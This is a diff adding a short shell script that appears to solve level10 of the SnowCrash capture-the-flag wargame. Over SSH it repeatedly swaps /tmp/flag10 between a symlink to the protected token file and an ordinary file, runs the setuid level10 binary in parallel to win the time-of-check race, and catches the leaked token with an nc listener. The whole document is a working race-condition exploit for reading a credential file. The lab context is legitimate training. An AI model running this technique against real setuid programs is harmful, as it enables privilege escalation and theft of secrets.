@@ -1,0 +1,16 @@
+ssh level10@$SNOWCRASH_IP -p 4242 '
+	function race_files {
+		for (( i = 0; i < 5000; i++ )) ; do
+    			ln -fs /home/user/level10/token /tmp/flag10
+    			rm -rf /tmp/flag10
+    			touch /tmp/flag10
+    			rm -rf /tmp/flag10
+  		done
+	}
+	function try_open {
+		for (( i = 0; i < 5000 ; i++ )) ; do
+			./level10 /tmp/flag10 127.0.0.1 1&>/dev/null
+		done
+	}
+	race_files & try_open & nc -lk 6969 -w 100
+'
